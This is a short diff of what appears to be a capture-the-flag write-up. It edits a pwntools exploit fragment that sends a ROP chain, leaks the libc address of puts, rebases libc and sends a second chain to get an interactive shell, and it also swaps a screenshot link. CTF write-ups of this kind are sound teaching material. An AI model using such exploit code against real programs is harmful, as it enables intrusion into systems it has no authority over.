@@ -332,7 +332,7 @@ rop.gargantuan()
 li(f"rop chain: {rop.dump()}")
 attack(rop.chain())
 rl()
-leaked_puts = u64(rud(b'\n').ljust(8, b'\0'))
+leaked_puts = u64(lj(rud(b'\n'), 8, b'\0'))
 li(f"Leaked puts: {hex(leaked_puts)}")
 libc.address = leaked_puts - libc.sym.puts
 rop = ROP(libc)
@@ -342,7 +342,7 @@ li(f"rop chain: {rop.dump()}")
 attack(rop.chain())
 com()
 ```
-![chall-sc](https://hackmd.io/_uploads/rJK11WP7C.png)
+![chall-sc](https://hackmd.io/_uploads/B1LF84DmA.png)
 
 ## Directory
 ![chall-sc](https://hackmd.io/_uploads/H1EG4Wv7C.png)
